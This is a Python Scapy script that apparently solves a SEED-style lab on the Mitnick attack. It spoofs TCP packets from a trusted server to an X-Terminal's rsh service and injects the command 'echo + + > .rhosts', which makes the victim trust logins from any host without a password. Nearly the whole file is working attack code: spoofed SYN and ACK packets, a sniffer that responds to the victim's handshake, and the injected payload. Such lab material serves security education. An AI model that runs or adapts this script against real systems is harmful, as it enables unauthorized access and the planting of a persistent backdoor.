#!/usr/bin/python3
from scapy.all import*

"""
    To be successful, we need to silence the trusted server 
    Trusted server's ARP record should be added to X-Terminal ARP-table
"""

MY_ISN = 778933536
STOP_SNIFF = False 

x_ip = "10.9.0.5" # X-Terminal 
x_port = 514 # Port number used by X-Terminal

srv_ip = "10.9.0.6" # The trusted server 
srv_port = 1023 # Port number used by the trusted server 

random_attacker_port= 9090


def spoof_pkt(pkt):
    global MY_ISN, STOP_SNIFF
    old_ip=pkt[IP]
    old_tcp=pkt[TCP]

    newseq = old_tcp.ack
    newack = old_tcp.seq + 1

    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4

    # Wait for SYN-ACK response from X-Terminal and make ACK
    if old_tcp.flags == "SA":
        print ("{}:{} -> {}:{} Flags={} Len={}".format(
                old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len)
        )
        ip=IP(src=srv_ip,dst=x_ip) #sending ack 
        tcp=TCP(sport=srv_port, dport=x_port, flags="A", seq=newseq, ack=newack)
        pkt=ip/tcp
        send(pkt, verbose=0)

        ip=IP(src=srv_ip, dst=x_ip)
        tcp=TCP(sport=srv_port, dport=x_port, flags="PA", seq=newseq, ack=newack)
        data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
        pkt = ip/tcp/data
        send(pkt,verbose=0)

    # Wait for SYN request of X-Terminal respond with SYN-ACK
    if old_tcp.flags=='S' and old_tcp.dport == random_attacker_port and old_ip.dst == srv_ip:
        print ("GOT SYN *** {}:{} -> {}:{} Flags={} Len={}".format(
                old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len)
        )
        ip=IP(src=srv_ip,dst=x_ip)
        tcp=TCP(sport=random_attacker_port, dport=srv_port, flags="SA", seq=MY_ISN, ack=old_ip.seq + 1)
        pkt=ip/tcp
        send(pkt, verbose=0)
        STOP_SNIFF = True


def stop_when(pkt):
    global STOP_SNIFF
    print("Done - check results!")
    return STOP_SNIFF


print("Sending Spoofed SYN packet to X-terminal (victim)")

# src is Trusted Server IP and dst is X-terminal IP
ip = IP(src="10.9.0.6", dst="10.9.0.5") 

# sport is Trusted Server port and dport is X-terminal port, S is SYN packet flag
tcp = TCP(sport=1023,dport=514,flags="S", seq=MY_ISN) 
pkt = ip/tcp 

# send packet
send(pkt,verbose=0) 

print("Main attack flow")
sniff(iface="br-c5df5a9fcd03", filter=f"tcp and src host {x_ip}", prn=spoof_pkt, stop_filter=stop_when) 

